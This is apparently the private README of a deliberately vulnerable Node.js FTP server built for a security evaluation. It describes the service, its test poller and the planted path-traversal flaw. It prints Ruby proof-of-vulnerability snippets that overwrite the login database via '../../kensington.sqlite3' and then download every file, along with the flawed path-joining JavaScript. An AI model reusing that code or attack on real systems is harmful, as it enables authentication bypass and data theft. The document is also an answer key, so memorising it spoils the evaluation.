# Kensington

This `README.md` MUST NOT be shared with performers or evaluation teams
before or during the Phase 2 evaluation event.
The `README-dist.md` file SHOULD be shared
with evaluation teams during the Phase 2 evaluation event.

The `priv/v4.4.0.tar.gz` file MUST NOT be distributed to evaluation teams as
part of the Phase 2 evaluation process.

## Description

Kensington is a modified open-source File Transfer Protocol (FTP) server for Node.js.

It supports anonymous and authenticated users. 

Anonymous users (identified with
the username "anonymous" and any password) are only allowed
to write files in `/data/ftproot/_anonymous/`, and are not allowed to retrieve
files.

Non-anonymous users are authenticated against the SQLite3 database
`/data/kensington.sqlite3`, and are allowed to read, write, and rename
files in
`/data/ftproot/`, including the `_anonymous_` directory.

### Scope for Analysis

This is an FTP server. Anonymous and authenticated access are supported.

This service uses a SQLite3 database to store user information. The structure
of this database is guaranteed (see the "Persistent Data" section below),
but the content may vary. Proofs-of-Vulnerability (PoVs) 
MAY depend on the `users` table existing. PoVs MUST NOT depend on
specific content in the `users` table.
PoVs MUST NOT depend on the
existence or content of a `users_cheatsheet` table. The `users_cheatsheet` is
only used by the poller, and the challenge attempts to delete this table on startup.

### Running It

Kensington is a JavaScript application. It can be run as-is:

```
guest> node ./bin/index.js
```

The challenge has several environment variables for configuration.

* `CHESS`: this environment variable is checked on startup; it doesn't need to
  be a particular value, just there.
* `DB_PATH`: the path to the user database, it defaults to
  `/data/kensington.sqlite3`
* `LOG_LEVEL`: sets the log level; it defaults to
  `DEBUG`, but it can be made less noisy. The list of levels are in
  `logger.js`
* `PORT`: the main FTP port, defaults to 3037
* `ROOT_DIR`: the FTP root directory, defaults to `/data/ftproot`

### Persistent Data

This challenge depends on successful reads and writes to the `/data` directory.
The poller operates on its own `/data` directory, that is expected to stay
synchronized with the challenge `/data`.
An initial load from `/base_data` is required for both the challenge and 
poller.
Emptying and re-loading the `/data`  directory from `/base_data`
may be useful for debugging.

FTP content is stored in `/data/ftproot/`. Normal poller operation will add
files to subdirectories here, but the filenames are timestamped and random,
and shouldn't conflict over multiple poller runs
[assuming the poller experiences linear time.][time]

[time]: https://infiniteundo.com/post/25326999628/falsehoods-programmers-believe-about-time

User data are stored in `/data/kensington.sqlite3`, in the following tables:

* `users`: `id` (integer pk), `name` (varchar),
  `password_digest` (scrypt),
  `created_at` (datetime)
* `users_cheatsheet`: `id` (integer pk), `name` (varchar),
  `password` (varchar)

The `users_cheatsheet` table will be deleted during the challenge
launch; the poller needs plaintext passwords, but the challenge does not, and
they're not in scope for proofs-of-vulnerability.

## Poller Operation

The poller is implemented in Ruby. It uses the built in `Net::FTP` library
to implement FTP operations.

The poller has several environment variables for configuration:

* `HOST` and `PORT`: the host and port number the challenge is available
  on. Defaults to `challenge` and `3038`, respectively.
* `NO_CLEANUP_ON_SUCCESS`: the poller creates a subdirectory in `/tmp` for
  validating the content of retrieved files. If this environment variable
  is set, this directory will not be deleted after a successful poller run.
  Unsuccessful poller runs should not delete this directory in any case.

The poller depends on having `/data` content match the challenge's, with the
addition of the `users_cheatsheet` table in `/data/kensington.sqlite3`. If it's
acting weird, on both the challenge and poller containers, destroy and 
re-create `/data` from `/base_data`.

## Vulnerability and Proof-of-Vulnerability

The unpatched version of the challenge has a weakness in how it resolves FTP
paths to filesystem paths that allows path traversal. However, anonymous users
are not allowed to read files,
so reading `/token` for a structured privileged information disclosure PoV does
not work.

Code listings below elide comments, format normalization, and other
irrelevant details.

The reference proof-of-vulnerability (PoV)
overwrites `/data/kensington.sqlite3` with a new login
database containing a known user, named `casper` with password `asdf`.

```ruby
Net::FTP.open(@host, port: @port,
              username: 'anonymous', 
              password: mk_name) do |ftp|

  ftp.put hacker_db, '../../kensington.sqlite3'
end
```

With this, the PoV is able to demonstrate an Authentication Error
(subtype "CWE-305: Authentication Bypass by Primary Weakness"),
log in as `casper`, get a directory listing,
and recursively download the entire server contents:

```ruby
Net::FTP.open(@host, port: @port,
              username: 'casper',
              password: 'asdf') do |ftp|
  directories = ftp.list

  directories.each do |dir|
    FileUtils.mkdir(File.join(stash, dir))
    Dir.chdir File.join(stash, dir) do
      ftp.chdir dir
      files = ftp.list

      files.each {|f| ftp.get f}
      ftp.chdir '..'
    end
  end
end
```

The weakness is in a somewhat-simplified path resolution algorithm.

The original uses Node.js's `path.normalize` (aliased to `nodePath.normalize`
in this listing) to first generate a noralized path to the FTP root, and then
uses that path to determine the filesystem root:

```js
const joinedPath = nodePath.isAbsolute(resolvedPath)
  ? nodePath.normalize(resolvedPath)
  : nodePath.join('/', this.cwd, resolvedPath);

// Create local filesystem path using the platform separator
const fsPath = nodePath.resolve(nodePath.join(this.root, joinedPath))
```

The vulnerable version attempts to do this on one shot, and will not filter
out traversal beyond `this.root`:

```js
let joinedPath = nodePath.
  join(this.root, this.cwd, resolvedPath)

let fsPath = nodePath.normalize(joinedPath)
```

The PoV will clobber the `/data/kensington.sqlite3` file in a way that will
break poller functionality and also make future PoV runs not actually
prove anything. You must reset the `/data` directory after every PoV
run.